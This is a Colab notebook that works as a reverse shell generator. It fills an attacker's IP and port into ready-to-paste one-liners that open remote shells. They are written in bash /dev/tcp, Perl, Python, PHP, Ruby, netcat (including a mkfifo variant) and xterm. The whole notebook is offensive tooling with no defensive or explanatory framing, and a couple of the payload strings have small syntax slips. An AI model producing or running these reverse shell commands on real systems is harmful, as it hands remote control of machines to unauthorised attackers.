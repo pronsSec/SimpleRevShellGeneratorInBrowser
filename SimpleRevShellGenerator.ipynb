{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "SimpleRevShellGenerator.ipynb",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": [],
      "authorship_tag": "ABX9TyP/8N01071Sztg65pQbvfJ+",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/pronsSec/SimpleRevShellGeneratorInBrowser/blob/main/SimpleRevShellGenerator.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#@title  { display-mode: \"form\" }\n",
        "#!/usr/bin/python\n",
        "\n",
        "\n",
        "import sys\n",
        "\n",
        "\n",
        "ip = ' ' #@param {type: \"string\"} \n",
        "port = '' #@param {type: \"string\"}\n",
        "print('-'*69)\n",
        "print('-'*69)\n",
        "print (\"Here's some rev shells for: \" + ip + \" on port \" + port)\n",
        "print('-'*69)\n",
        "print('-'*69)\n",
        "bash = \"bash -i >& /dev/tcp/\"+ip+\"/\"+port+\" 0>&1\"\n",
        "perlLong = \"\"\"perl -e 'use Socket;$i=\\\"\"\"\" + ip + \"\"\"\";$p=\"\"\"+port+\"\"\";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\"\"\"\n",
        "python = \"\"\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"\"\"\"+ip+\"\"\"\",\"\"\"+port+\"\"\"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno,2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\"\"\"\n",
        "php = \"\"\"php -r '$sock=fsockopen(\\\"\"\"\"+ip+\"\"\"\",\"\"\"+port+\"\"\");exec(\"/bin/sh <i <&3 >&3 2>&3\");'\"\"\"\n",
        "ruby = \"\"\"ruby -rsocket -e'f=TCPSocket.open(\\\"\"\"\"+ip+\"\"\"\",\"\"\"+port+\"\"\").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\", f,f,f)'\"\"\"\n",
        "nc = \"\"\"nc -e /bin/sh \"\"\"+ip+\"\"\" \"\"\"+port\n",
        "nc2 = \"\"\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc \"\"\"+ip+\"\"\" \"\"\"+port+\"\"\" >/tmp/f\"\"\"\n",
        "xterm = \"\"\"xterm -display \"\"\"+ip+\"\"\":\"\"\"+port\n",
        "\n",
        "\n",
        "asci = '''\n",
        "  _________.__           .__  .__          \n",
        " /   _____/|  |__   ____ |  | |  |   ______\n",
        " \\_____  \\ |  |  \\_/ __ \\|  | |  |  /  ___/\n",
        " /        \\|   Y  \\  ___/|  |_|  |__\\___ \\ \n",
        "/_______  /|___|  /\\___  >____/____/____  >\n",
        "        \\/      \\/     \\/               \\/ \n",
        "'''\n",
        "\n",
        "print(asci)\n",
        "print('-'*69)\n",
        "print('-'*69)\n",
        "print('-'*69)\n",
        "print (\"[*]BASH \\n\" + bash + \"\\n\")\n",
        "print('-'*69)\n",
        "print (\"[*]PERL \\n\" + perlLong + \"\\n\")\n",
        "print('-'*69)\n",
        "print (\"[*]PYTHON \\n\" + python + \"\\n\")\n",
        "print('-'*69)\n",
        "print (\"[*]PHP \\n\" + php + \"\\n\")\n",
        "print('-'*69)\n",
        "print (\"[*]RUBY \\n\" + ruby + \"\\n\")\n",
        "print('-'*69)\n",
        "print (\"[*]NETCAT \\n\" + nc + \"\\n\")\n",
        "print('-'*69)\n",
        "print (\"[*]NETCAT WITH MKFIFO\\n\" + nc2 + \"\\n\")\n",
        "print('-'*69)\n",
        "print (\"[*]XTERM\\n\" + xterm + \"\\n\")\n",
        "print('-'*69)\n",
        "print('-'*69)\n",
        "print('-'*69)\n",
        "\n"
      ],
      "metadata": {
        "id": "4UrUnPD7MOYi"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}